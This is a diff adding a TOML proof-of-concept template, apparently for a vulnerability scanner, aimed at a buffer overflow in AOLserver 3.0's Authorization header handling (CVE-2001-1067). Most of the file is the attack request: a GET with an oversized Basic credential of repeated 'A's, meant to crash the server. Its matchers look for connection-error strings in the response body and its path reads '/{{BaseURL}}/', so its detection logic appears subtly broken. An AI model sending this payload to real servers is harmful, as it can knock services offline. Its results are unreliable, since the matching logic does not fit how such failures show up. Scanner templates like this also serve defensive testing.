@@ -1,0 +1,42 @@
+[info]
+author = "ave"
+description = "检测 AOLserver 3.0 是否受远程缓冲区溢出漏洞影响。通过发送超长 Authorization 头的 HTTP 请求，触发服务端缓冲区溢出，导致服务崩溃或异常响应。"
+id = "POC-AVE-2001-0447"
+name = "AOLserver 3.0 Authorization Header Buffer Overflow PoC"
+severity = "critical"
+tags = [
+    "cve-2001-1067",
+    "aolserver",
+    "buffer-overflow",
+]
+vuln_id = [
+    "CVE-2001-1067",
+    "AVE-2001-0447",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Authorization = "Basic AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Connection refused",
+    "No route to host",
+    "connection refused",
+    "Connection reset",
+]
